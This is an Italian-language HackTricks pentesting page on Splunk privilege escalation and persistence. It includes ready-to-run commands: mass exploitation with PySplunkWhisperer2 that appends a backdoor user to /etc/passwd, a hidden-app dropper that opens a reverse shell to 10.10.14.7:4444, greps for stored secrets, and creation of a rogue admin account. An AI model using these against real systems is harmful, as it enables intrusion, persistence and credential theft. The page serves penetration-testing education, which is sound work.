# Splunk LPE e Persistence

{{#include ../../banners/hacktricks-training.md}}

Se durante l'**enumerazione** di una macchina **internamente** o **esternamente** trovi **Splunk in esecuzione** (solitamente **8000** per la web UI e **8089** per la management API), credenziali valide possono spesso essere trasformate in **code execution** tramite l'installazione di app, gli scripted inputs o le management actions. Se Splunk è in esecuzione come **root**, questo si traduce frequentemente in un'immediata **privilege escalation**.

Se ti serve soltanto la remote attack surface generica, l'enumerazione o il percorso di RCE tramite upload di app, consulta:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Se sei **già root** e il servizio Splunk non è in ascolto solo su localhost, puoi anche rubare gli **hash delle password di Splunk**, recuperare i **segreti crittografati** o distribuire una **malicious app** per mantenere la persistence localmente o su più forwarder.

## File locali interessanti

Quando ottieni accesso a un host che esegue Splunk o Splunk Universal Forwarder, questi sono solitamente i path più interessanti:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Artefatti importanti:

- **`$SPLUNK_HOME/etc/passwd`**: utenti locali Splunk e hash delle password.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: chiave utilizzata da Splunk per cifrare i secrets archiviati in diversi file `.conf`.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: file di bootstrap dell'amministratore iniziale; utile nelle gold image e in caso di errori di provisioning. Viene ignorato se `etc/passwd` esiste già.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: posizione in cui gli scripted inputs vengono comunemente abilitati.
- **`$SPLUNK_HOME/etc/deployment-apps/`** o **`$SPLUNK_HOME/etc/apps/`**: buone posizioni in cui nascondere un'app persistente o verificare cosa viene già distribuito.

## Riepilogo dell'exploit dell'agente Splunk Universal Forwarder

Per ulteriori dettagli, consulta [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Questo è solo un riepilogo:

**Panoramica dell'exploit:**
Un exploit che prende di mira Splunk Universal Forwarder (UF) consente agli attacker in possesso della **password dell'agente** di eseguire codice arbitrario sui sistemi che eseguono l'agente, compromettendo potenzialmente gran parte dell'ambiente.

**Perché funziona:**

- Il servizio di gestione UF è comunemente esposto sulla porta **TCP 8089**.
- Gli attacker possono autenticarsi all'API e ordinare al forwarder di installare un **bundle di app malevolo**.
- La stessa primitive può essere utilizzata localmente per **LPE** o da remoto per **RCE**.
- Strumenti pubblici come **SplunkWhisperer2** creano automaticamente il bundle dell'app e possono adattare i payload per i target Linux.

**Modalità comuni per recuperare la password:**

- Credenziali in chiaro presenti in documentazione, script, share o automazione del deployment.
- Hash delle password all'interno di `$SPLUNK_HOME/etc/passwd`, seguiti da cracking offline.
- Gold image o residui del provisioning, come `user-seed.conf`.

**Impatto:**

- Esecuzione di codice con privilegi SYSTEM/root su ciascun host compromesso.
- Deployment di app persistenti, backdoor o ransomware.
- Disabilitazione o manomissione della telemetria prima dell'inoltro dei dati.

**Comando di esempio per l'exploitation:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Exploit pubblici utilizzabili:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistenza tramite Scripted Inputs o App dannose

Se disponi di **accesso in scrittura al filesystem** come `root`/`splunk`, oppure di accesso autenticato per installare app, un meccanismo di persistenza molto affidabile consiste nel distribuire una **custom app** con uno **scripted input**. La documentazione ufficiale di Splunk prevede che gli scripted inputs risiedano nella directory di un'app e siano abilitati tramite `inputs.conf`.

Struttura tipica:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
`inputs.conf` minimale:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Dropper Linux rapido:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Note:

- Lo stesso trucco funziona su **Universal Forwarder** usando `/opt/splunkforwarder/etc/apps/`.
- Gli attaccanti spesso si mimetizzano modificando un add-on legittimo invece di creare un'app evidentemente malevola.
- Su un **deployment server**, inserire un'app malevola in `deployment-apps/` si trasforma in **persistence a livello dell'intera flotta**, perché i forwarder eseguono il polling, scaricano le app aggiornate e spesso si riavviano per applicarle.

## Furto di credenziali e takeover dell'amministratore

Se puoi leggere i file locali di Splunk, di solito ci sono due obiettivi validi: recuperare l'**accesso amministrativo a Splunk** e recuperare le **credenziali dei servizi cifrate**.

### Hash delle password e utenti locali

Splunk memorizza i dati di autenticazione locali in `etc/passwd`. A seconda del deployment, il cracking di quel file può consentire di recuperare credenziali funzionanti per la web UI e la management API.

Se disponi già di credenziali **admin** valide e Splunk usa il backend di autenticazione **native**, la CLI stessa può essere utilizzata per la persistence:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` e valori cifrati

Splunk utilizza `etc/auth/splunk.secret` per proteggere i valori sensibili memorizzati in diversi file di configurazione. Se riesci a sottrarre sia il **secret** sia i relativi file **`.conf`**, spesso puoi recuperare o riutilizzare:

- shared secret di forwarder/indexer come `pass4SymmKey`
- password delle chiavi private TLS come `sslPassword`
- credenziali di bind LDAP come `bindDNPassword`

Questo è utile per il **lateral movement** anche quando la password dell'amministratore Splunk non è crackabile.

### Abuso di `user-seed.conf`

`user-seed.conf` viene utilizzato solo durante il primo avvio o quando `etc/passwd` non esiste. Questo lo rende meno utile su un sistema live, ma molto interessante in:

- template di installazione compromessi
- immagini dei container
- workflow di provisioning non presidiati
- appliance in cui Splunk viene reinizializzato automaticamente

In questi casi, inserire un `HASHED_PASSWORD` generato con `splunk hash-passwd` ti offre un modo discreto per recuperare l'accesso admin dopo il redeployment.

## Abuso delle query Splunk

Per ulteriori dettagli consulta [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).

Una tecnica recente utile consiste nell'abusare di **XSLT fornito dall'utente** nelle versioni vulnerabili di Splunk Enterprise, trasformando un account autenticato con privilegi ridotti in **esecuzione di comandi OS** come utente `splunk`.

Flusso ad alto livello:

1. Effettua l'autenticazione a Splunk.
2. Carica un file **XSL** malevolo tramite la funzionalità di preview/upload.
3. Fai in modo che Splunk esegua il rendering dei risultati della ricerca con quel foglio di stile caricato dalla directory **dispatch**.
4. Utilizza il payload XSLT per scrivere un file o attivare l'esecuzione tramite la search pipeline di Splunk, ad esempio raggiungendo funzionalità interne come `runshellscript`.

L'aspetto offensivo importante è che questo percorso consente una **RCE post-auth senza richiedere l'app upload**. Su Linux, di solito si ottiene l'account **`splunk`**, che resta comunque prezioso perché spesso è il proprietario dell'albero applicativo, può leggere i secret e può installare app persistenti che sopravvivono alla perdita della shell.

Un percorso rappresentativo utilizzato durante lo sfruttamento è:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Se Splunk viene eseguito con troppi privilegi, oppure se l'utente `splunk` ha accesso a script pericolosi, unità di servizio modificabili o regole `sudo` errate, ciò può diventare una catena **LPE** lineare.

## Riferimenti

- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
{{#include ../../banners/hacktricks-training.md}}
